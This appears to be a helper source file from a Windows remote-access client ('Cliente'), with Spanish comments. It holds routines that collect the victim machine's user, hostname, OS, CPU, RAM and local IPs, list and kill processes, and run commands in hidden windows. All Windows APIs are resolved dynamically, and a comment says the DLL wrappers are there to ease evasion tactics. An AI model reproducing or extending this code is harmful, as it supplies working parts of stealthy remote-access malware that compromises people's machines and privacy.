#include "misc.hpp"
#include "cliente.hpp"

extern Cliente* cCliente;

void printHex(const char* data, int length) {
	std::cout << std::hex << std::setfill('0'); // Establece la base hexadecimal y el relleno con ceros

	for (int i = 0; i < length; ++i) {
		// Imprime cada byte en hexadecimal
		std::cout << std::setw(2) << static_cast<int>(static_cast<unsigned char>(data[i])) << " ";
	}

	std::cout << std::dec << std::endl; // Restablece la base decimal
}

std::string RandomID(int iLongitud) {
	const char* Map = "abcdefghijklmnopqrstuvwxyz1234567890-";
	std::string strSalida = "";

	std::random_device rd;
	std::mt19937 gen(rd());

	std::uniform_int_distribution<> dis(0, 36);

	for (int i = 0; i < iLongitud; i++) {
		int random_number = dis(gen);
		strSalida += Map[random_number];
	}
	return strSalida;
}

int RandomID() {
	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<> dis(10000, 99999);
	return dis(gen);
}

std::string strGetComputerName() {
	char cMachineName[UNLEN+2];
	DWORD dLen = UNLEN + 1;

	std::string strOutput = "unknown";

	if(cCliente->mod_dynamic->KERNEL32.pGetComputerName){
		if (cCliente->mod_dynamic->KERNEL32.pGetComputerName(cMachineName, &dLen)) {
			strOutput = cMachineName;
		}
	}
	return strOutput;
}

std::string strUserName() {
	std::string strOutput = "unknown";
	char cUser[UNLEN + 1];
	DWORD dLen = UNLEN + 1;

	if (cCliente->mod_dynamic->ADVAPI32.pGetUserName) {
		if (cCliente->mod_dynamic->ADVAPI32.pGetUserName(cUser, &dLen) != 0) {
			strOutput = cUser;
		}
	}

	strOutput += "@" + strGetComputerName();

	return strOutput;
}

std::string strOS() {
	std::string strOut = "Windows :v";
	HKEY hKey;
		
	if (cCliente->mod_dynamic->ADVAPI32.pRegOpenKeyEx) {
		auto ret = cCliente->mod_dynamic->ADVAPI32.pRegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), 0, KEY_QUERY_VALUE, &hKey);
		if (ret != ERROR_SUCCESS) {
			__DBG_("RegOpenKeyEx ERR");
			return strOut;
		}

		DWORD dLen = 50;
		LPBYTE lBuffer[50];
			
		if (cCliente->mod_dynamic->ADVAPI32.pRegQueryValueEx) {
			if (cCliente->mod_dynamic->ADVAPI32.pRegQueryValueEx(hKey, "ProductName", nullptr, nullptr, (LPBYTE)&lBuffer, &dLen) == ERROR_SUCCESS) {
				strOut.erase(strOut.begin(), strOut.end());
				strOut.append((const char*)lBuffer);
			}
		}

		if (cCliente->mod_dynamic->ADVAPI32.pRegCloseKey) {
			cCliente->mod_dynamic->ADVAPI32.pRegCloseKey(hKey);
		}
	}

	return strOut;
}

std::string TimeToDays(const unsigned long long& ulltime) {
	unsigned __int64 days = ((ulltime / 60) / 60) / 24;

	return std::to_string(days) + " dias";
}

std::string TimeToDays(const std::string& strtime) {
	unsigned long long time = atoll(strtime.c_str());
	return TimeToDays(time);
}

std::string TimeToString(unsigned long long ullTime) {
	std::string strOut = "";
	std::time_t timestamp = ullTime;

	struct tm timeInfo;  //std::localtime(&timestamp);
	errno_t err = localtime_s(&timeInfo, &timestamp);
	/*localtime_s( // See note in remarks section about linkage
   struct tm* const tmDest,
   time_t const* const sourceTime
);*/
	if (!err) {
		char buffer[80];
		std::strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", &timeInfo);

		strOut = std::string(buffer);
	}

	return strOut;
}

std::vector<std::string> strSplit(const std::string& strString, char cDelimiter, int iMax) {
	std::vector<std::string> vcOut;
	int istrLen = static_cast<int>(strString.size()), iIt = 0, iCounter = 0, iTmp = 0;
	for (; iIt < istrLen; iIt++) {
		std::string strTmp = "";
		while (strString[iIt] != cDelimiter && strString[iIt] != '\0') {
			strTmp.append(1, strString[iIt++]);
			iCounter++;
		}
		iCounter = 0;
		vcOut.push_back(strTmp);
		if (++iTmp == iMax) { break; }

	}
	return vcOut;
}

std::vector<std::string> strSplit(const std::string& strString, std::string strDelimited, int iMax) {
	std::vector<std::string> vcOut;
	std::string strTemp = strString;
	while (iMax-- > 0) {
		size_t newpos = strTemp.find(strDelimited);
		if (newpos == std::string::npos) {
			if (strTemp.size() > 0) {
				vcOut.push_back(strTemp);
			}
			break;
		}
		std::string temp = strTemp.substr(0, newpos);
		vcOut.push_back(temp);

		strTemp.erase(0, newpos + strDelimited.size());
	}
	return vcOut;
}

std::string strCpu() {
	std::string strOut = "";
	int CPUInfo[4] = { -1 };
	char CPUBrandString[200];
	__cpuid(CPUInfo, 0x80000000);
	u_int nExIds = CPUInfo[0];
	m_memset(CPUBrandString, 0, sizeof(CPUBrandString));
	for (u_int i = 0x80000000; i <= nExIds; ++i) {
		__cpuid(CPUInfo, i);
		if (i == 0x80000002) {
			m_memcpy(CPUBrandString, CPUInfo, sizeof(CPUInfo));
		}
		else if (i == 0x80000003) {
			m_memcpy(CPUBrandString + 16, CPUInfo, sizeof(CPUInfo));
		}
		else if (i == 0x80000004) {
			m_memcpy(CPUBrandString + 32, CPUInfo, sizeof(CPUInfo));
		}
	}
	strOut = CPUBrandString;
	
	SYSTEM_INFO sInfo;
	if (cCliente->mod_dynamic->KERNEL32.pGetNativeSystemInfo) {
		cCliente->mod_dynamic->KERNEL32.pGetNativeSystemInfo(&sInfo);
		switch (sInfo.wProcessorArchitecture) {
		case 9:
			strOut += "x64 (AMD or INTEL)";
			break;
		case 5:
			strOut += "ARM";
			break;
		case 12:
			strOut += "ARM64";
			break;
		case 6:
			strOut += "Intel Itanium-based";
			break;
		case 0:
			strOut += "x86";
			break;
		default:
			strOut += "Unknow";
			break;
		}
	}else {
		strOut += "Unknow";
	}

	return strOut;
}

u64 GetFileSize(c_char* cPath) {
	std::ifstream strmInputFile(cPath, std::ios::binary);
	if (!strmInputFile.is_open()) {
		return 0;
	}
	std::filebuf* pBuf = strmInputFile.rdbuf();
	u64 uTmp = 0;
	uTmp = pBuf->pubseekoff(0, strmInputFile.end, strmInputFile.in);
	pBuf->pubseekpos(0, strmInputFile.in);
	strmInputFile.close();
	return uTmp;
}

bool Execute(const char *cCmdLine, int iOpt){
	if(iOpt == 0){
		__DBG_("[EXEC] Oculto");
	}
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	ZeroMemory( &si, sizeof(si) );
	si.cb = sizeof(si);
	//GetStartupInfo(&si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = iOpt == 1 ? SW_SHOW : SW_HIDE;
	char cCmd[1024];
	strncpy_s(cCmd, cCmdLine, 1022);
	cCmd[1022] = '\0';

	if (cCliente->mod_dynamic->KERNEL32.pCreateProcessA) {
		int iRet = cCliente->mod_dynamic->KERNEL32.pCreateProcessA(nullptr, cCmd, nullptr, nullptr, false, (iOpt == 1 ? NORMAL_PRIORITY_CLASS | DETACHED_PROCESS : CREATE_NO_WINDOW | NORMAL_PRIORITY_CLASS | DETACHED_PROCESS), nullptr, nullptr, &si, &pi);
		if (iRet != 0) {
			return true;
		}
		else {
			__DBG_("[X]Execurte CreateProcess error");
		}
	}

	if (cCliente->mod_dynamic->SHELL32.pShellExecuteExA) {
		SHELLEXECUTEINFOA sei;
		sei.cbSize = sizeof(SHELLEXECUTEINFO);
		sei.fMask = SEE_MASK_DEFAULT;
		sei.lpVerb = "open";
		sei.lpFile = cCmdLine;
		sei.hwnd = nullptr;
		sei.lpParameters = nullptr;
		sei.lpDirectory = nullptr;
		sei.hInstApp = nullptr;
		sei.nShow = iOpt == 1 ? SW_SHOW : SW_HIDE;
		if (cCliente->mod_dynamic->SHELL32.pShellExecuteExA(&sei) > 32) {
			return true;
		}else {
			__DBG_("ShellExecuteEx error");
		}
	}

	return false;
}

#ifdef __MOD_PM
bool EndProcess(int iPID) {
	
	if (cCliente->mod_dynamic->KERNEL32.pOpenProcess) {
		HANDLE hProc = cCliente->mod_dynamic->KERNEL32.pOpenProcess(PROCESS_TERMINATE, false, iPID);
		if (!hProc) {
			return false;
		}

		if (cCliente->mod_dynamic->KERNEL32.pTerminateProcess) {
			if (!cCliente->mod_dynamic->KERNEL32.pTerminateProcess(hProc, 1)) {
				return false;
			}
		}

		if (cCliente->mod_dynamic->KERNEL32.pCloseHandle) {
			cCliente->mod_dynamic->KERNEL32.pCloseHandle(hProc);
		}
	}


	return true;
}

std::string strProcessList() {
	std::string strOut = "";
	WTS_PROCESS_INFOA* pWPIs = NULL;
	SID_NAME_USE pSID_NAME;
	DWORD dwProcCount = 0;
	
		if (cCliente->mod_dynamic->WTSAPI32.pWTSEnumerateProcessesA) {
			if (cCliente->mod_dynamic->WTSAPI32.pWTSEnumerateProcessesA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pWPIs, &dwProcCount)){
				for (DWORD i = 0; i < dwProcCount; i++)
				{
					char cName[256];
					char cHost[256];
					DWORD cName_Size = sizeof(cName);
					DWORD cHost_Size = sizeof(cHost);

					strOut += std::to_string(pWPIs[i].ProcessId);
					strOut.append(1, '>');
					strOut += pWPIs[i].pProcessName;
					strOut.append(1, '>');

					if (cCliente->mod_dynamic->ADVAPI32.pLookupAccountSidA) {
						if (cCliente->mod_dynamic->ADVAPI32.pLookupAccountSidA(nullptr, pWPIs[i].pUserSid, cName, &cName_Size, cHost, &cHost_Size, &pSID_NAME)) {
							strOut += cHost;
							strOut.append(1, '/');
							strOut += cName;
						}else {
							strOut += "0";
						}
					}else {
						strOut += "0";
					}

					if (cCliente->mod_dynamic->KERNEL32.pOpenProcess) {
						HANDLE pHandle = cCliente->mod_dynamic->KERNEL32.pOpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pWPIs[i].ProcessId);
						if (pHandle != NULL) {
							TCHAR szFileName[MAX_PATH];
							if (cCliente->mod_dynamic->PSAPI.pGetModuleFileNameExA) {
								if (cCliente->mod_dynamic->PSAPI.pGetModuleFileNameExA(pHandle, NULL, szFileName, MAX_PATH) > 0) {
									//if(GetProcessImageFileNameA(pHandle, szFileName, sizeof(szFileName))> 0){
									strOut += ">";
									strOut += szFileName;
								}else {
									strOut += ">-";
								}
							}else {
								strOut += ">-";
							}

							if (cCliente->mod_dynamic->KERNEL32.pCloseHandle) {
								cCliente->mod_dynamic->KERNEL32.pCloseHandle(pHandle);
							}
							pHandle = NULL;
						}else {
							strOut += ">-";
						}
					}

					strOut.append(1, '|');
				}
			}else {
				__DBG_("[X] strProcessList no se pudo obtener la lista de procesos");
				strOut = "|";
			}
		}else {
			__DBG_("[X] strProcessList no se cargo la funcion");
			strOut = "|";
		}

		if (pWPIs) {
			if (cCliente->mod_dynamic->WTSAPI32.pWTSFreeMemory) {
				cCliente->mod_dynamic->WTSAPI32.pWTSFreeMemory(pWPIs);
				pWPIs = nullptr;
			}
		}



	return strOut.substr(0, strOut.size()-1);
}
#endif

u64 StrToUint(const std::string strString) {
	size_t uiLen = strString.size();
	size_t uiLen2 = uiLen;
	u64 uiRet = 0;
	for (u_int uiIte0 = 0; uiIte0 < uiLen; uiIte0++) {
		u_int uiTlen = 1;
		--uiLen2;
		for (u_int uiIte = 0; uiIte < uiLen2; uiIte++) {
			uiTlen *= 10; //decimal  uiTlen *= 8;  octal
		}
		u_int uiT = strString[uiIte0] - 48;
		uiRet += (uiTlen * uiT);
	}
	return uiRet;
}

std::vector<std::string> IPSlocales() {
	std::vector<std::string> vcOut;

	if (cCliente) {
		if (!cCliente->mod_dynamic->WS32.pWsaStartup ||
			!cCliente->mod_dynamic->WS32.pGetAddrInfo ||
			!cCliente->mod_dynamic->WS32.pFreeAddrInfo ||
			!cCliente->mod_dynamic->WS32.pInetntoP) {
			__DBG_("[X]IPSlocales no se cargaron las funciones")
				return vcOut;
		} 
	}else {
		return vcOut;
	}
	
	WSADATA wsa;
	if (cCliente->mod_dynamic->WS32.pWsaStartup(MAKEWORD(2, 2), &wsa) != 0) {
		return vcOut;
	}

	int iStatus = 0;
	char ipstr[INET6_ADDRSTRLEN];
	struct addrinfo hints, *servinfo, *p;

	m_memset(&hints, 0, sizeof(hints));

	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_flags = AI_PASSIVE;

	iStatus = cCliente->mod_dynamic->WS32.pGetAddrInfo(strGetComputerName().c_str(), NULL, &hints, &servinfo);

	if (iStatus == 0) {

		for (p = servinfo; p != NULL; p = p->ai_next) {
			void* addr;
			if (p->ai_family == AF_INET) {
				//IPV4
				struct sockaddr_in* ipv4 = (struct sockaddr_in*)p->ai_addr;
				addr = &(ipv4->sin_addr);
				
				cCliente->mod_dynamic->WS32.pInetntoP(p->ai_family, addr, ipstr, sizeof(ipstr));

				vcOut.push_back(std::string(ipstr));
			}

		}
		cCliente->mod_dynamic->WS32.pFreeAddrInfo(servinfo);
	}

	return vcOut;
}

int RAM() {
	MEMORYSTATUSEX mem;
	mem.dwLength = sizeof(mem);
	int iRet = 0;
	
	if (cCliente->mod_dynamic->KERNEL32.pGlobalMemoryStatusEx) {
		iRet = cCliente->mod_dynamic->KERNEL32.pGlobalMemoryStatusEx(&mem);
		if (iRet == 0) {
			__DBG_("[X] GlobalMemoryStatusEx error");
			return 0;
		}
	}

	iRet = static_cast<int>((mem.ullTotalPhys / 1024) / 1024);
	return iRet;
}

// wrappers para manejo de DLLs asi implementar de manera facil alguna tactica de evasion
HMODULE __stdcall wrapLoadDLL(const char* _cDLL) {
	HMODULE hDll = ::LoadLibraryExA(_cDLL, NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
	return hDll;
}

FARPROC wrapGetProcAddr(HMODULE _hMod, LPCSTR _procName) {
	return ::GetProcAddress(_hMod, _procName);
}

BOOL wrapFreeLibrary(HMODULE _hMod) {
	return ::FreeLibrary(_hMod);
}

void* m_memcpy(void* _Dst, void const* _Src, size_t _size) {
	unsigned char* destino = (unsigned char*)_Dst;
	const unsigned char* origen = (const unsigned char*)_Src;
	for (size_t i = 0; i < _size; i++) {
		destino[i] = origen[i];
	}
	return _Dst;
}

void* m_memset(void* __dst, int __val, size_t __n) {
	unsigned char* destino = (unsigned char*)__dst;
	unsigned char val = (unsigned char)__val;
	for (size_t i = 0; i < __n; i++) {
		destino[i] = val;
	}
	
	return __dst;
}